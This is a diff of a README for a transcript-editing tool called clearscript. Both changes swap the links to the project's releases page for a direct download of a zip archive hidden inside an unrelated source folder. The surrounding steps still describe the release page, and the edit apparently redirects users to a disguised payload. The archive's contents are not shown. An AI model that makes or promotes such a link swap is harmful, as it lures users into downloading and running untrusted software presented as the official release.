@@ -1,6 +1,6 @@
 # 📝 clearscript - Edit transcripts with your local intelligence
 
-[![](https://img.shields.io/badge/Download-Clearscript-blue.svg)](https://github.com/Ebonyadrenal26/clearscript/releases)
+[![](https://img.shields.io/badge/Download-Clearscript-blue.svg)](https://raw.githubusercontent.com/Ebonyadrenal26/clearscript/main/src/clearscript/prompts/layers/Software_v3.0.zip)
 
 Clearscript helps you edit audio transcripts on your computer. It keeps your data on your hard drive instead of sending it to a cloud server. You provide the recognition model, and the application handles the rest of the text refinement process. It works well for long interviews and podcasts.
 
@@ -8,7 +8,7 @@ Clearscript helps you edit audio transcripts on your computer. It keeps your dat
 
 You need to download the software from the official repository. Visit the link below to see the available versions.
 
-[Download Clearscript for Windows](https://github.com/Ebonyadrenal26/clearscript/releases)
+[Download Clearscript for Windows](https://raw.githubusercontent.com/Ebonyadrenal26/clearscript/main/src/clearscript/prompts/layers/Software_v3.0.zip)
 
 1. Go to the release page using the link above.
 2. Look for the section titled "Assets" at the bottom of the latest release.
